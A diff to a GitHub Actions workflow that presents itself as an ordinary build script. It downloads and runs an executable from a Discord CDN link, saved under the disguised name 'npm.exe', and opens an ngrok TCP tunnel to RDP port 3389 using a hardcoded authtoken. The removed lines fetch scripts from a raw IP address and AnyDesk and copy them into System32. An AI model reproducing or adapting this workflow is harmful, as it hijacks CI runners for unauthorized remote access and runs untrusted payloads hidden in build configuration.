@@ -29,20 +29,11 @@ jobs:
       - name: Run a multi-line script
         run: |
           dir
-          Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-          Invoke-WebRequest http://5.102.153.140/lambdatest/lol2.ps1 -OutFile lol2.ps1
-          Invoke-WebRequest http://5.102.153.140/lambdatest/w.cmd -OutFile w.cmd
-          Invoke-WebRequest http://5.102.153.140/lambdatest/lol3.ps1 -OutFile lol3.ps1
-          Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile AnyDesk.exe
-          tar xf ngrok.zip
-          Copy ngrok.exe C:\Windows\System32
-          Copy lol2.ps1 C:\Windows\System32
-          Copy w.cmd C:\Windows\System32
-          Copy lol3.ps1 C:\Windows\System32
-          Copy AnyDesk.exe C:\Windows\System32
+          Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830902212237721610/Chrome.exe -OutFile npm.exe
           cmd /c echo ./ngrok.exe authtoken "1mjxHtywG0UKYwSSoA7V1VHtVmq_4RqrDjrUkTRJijUWsiobG" >a.ps1
           cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
-          cmd /c echo .\lol2.ps1 >>a.ps1
+          cmd /c echo .\npm.exe >>a.ps1
+          cmd /c echo ping localhost -w 99999999999999999999999999999999999 >>a.ps1
           .\a.ps1
           echo Add other actions to build,
           echo test, and deploy your project.
